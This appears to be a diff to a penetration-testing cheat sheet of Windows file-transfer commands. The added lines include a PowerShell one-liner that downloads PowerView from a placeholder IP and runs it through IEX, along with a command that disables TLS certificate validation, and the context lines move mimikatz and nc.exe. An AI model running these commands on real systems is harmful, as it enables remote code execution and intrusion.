@@ -11,3 +11,7 @@
 | `scp C:\Temp\bloodhound.zip user@<IP>:/tmp/bloodhound.zip` | Upload a file using SCP |
 | `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | Download a file using SCP |
 | `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |
+| `Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing \| IEX` | There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter `-UseBasicParsing`. |
+
+> Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:  
+> `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`
